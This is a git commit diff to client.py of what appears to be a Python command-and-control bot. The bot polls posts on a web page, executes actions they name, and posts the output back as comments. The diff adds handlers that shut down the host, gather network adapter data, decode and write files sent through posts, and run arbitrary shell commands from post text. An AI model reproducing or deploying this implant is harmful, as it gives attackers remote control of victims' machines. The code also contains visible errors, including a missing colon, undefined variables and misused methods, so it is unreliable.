ec8a346c2880a63d0132199f2d386af02244af7f
Kimo Bumanglag <kbumanglag@Kimos-MacBook-Pro.local>
2020-04-15 21:34:40 -0400

    Implemented client functionality

--- client.py
+++ client.py
@@ -1,5 +1,9 @@
 import requests
 import subprocess
+import re
+import base64
+import string
+import secrets
 from time import sleep
 from BeautifulSoup import BeautifulSoup
 
@@ -22,27 +26,40 @@ def process_actions(posts):
         a_date = post.find("span", {"class": "post-date"}).getText()
         a_post = post.find("p", {"class": "post-body"})
         if a_date in COMPLETE_ACTIONS:
-            print 'Already ran command {0}'.format(a_post)
+            print("Already ran command {0}".format(a_post))
         else:
             action = a_post.attrs("data-action",)
             if action == "shutdown-host"
-                pass
+                command = "shutdown /s /t 0"
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                data = proc.stdout.read() + proc.stderr.read()
             elif action == "shutdown-client":
-                pass
+                exit()
             elif action == "get-mac":
-                proc = subprocess.Popen(a_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                command = "ipconfig /all"
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout_v = proc.stdout.read() + proc.stderr.read()
-                pass
+                data = stdout_v.match("Physical")
             elif action == "upload-file":
-                pass
+                filebase64 = a_post.getText()
+                fileraw = base64.b64decode(filebase64)
+                filename=secrets.choice(string.ascii_uppercase)+secrets.choice(string.punctuation)\
+                    +secrets.choice(string.ascii_lowercase)+secrets.choice(string.ascii_lowercase)\
+                    +secrets.choice(string.digits)+secrets.choice(string.digits)+secrets.choice(string.digits)\
+                    +secrets.choice(string.ascii_lowercase)
+                with open(filename,'w+b') as f:
+                    f.write(fileraw)
+                data = "Saved file as {0}".format(filename)
             elif action == "shell-command":
-                pass
+                command = a_post.getText()
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                data = proc.stdout.read() + proc.stderr.read()
             post_id = post.find("a")['href'].split('/')[-1]
-            print 'Ran command: {0}\n{1}'.format(a_command, stdout_v)
+            print('Ran command: {0}\n{1}'.format(a_command, data))
             payload = {'username': 'bot', 'body': stdout_v, 'post_id': post_id}
             status = send_comment(payload)
-            print 'Status: {0}'.format(status)
-            COMPLETE_ACTIONS[a_date] = a_command
+            print('Status: {0}'.format(status))
+            COMPLETE_ACTIONS[a_date] = a_post
 
 while(True):
     page = get_page()
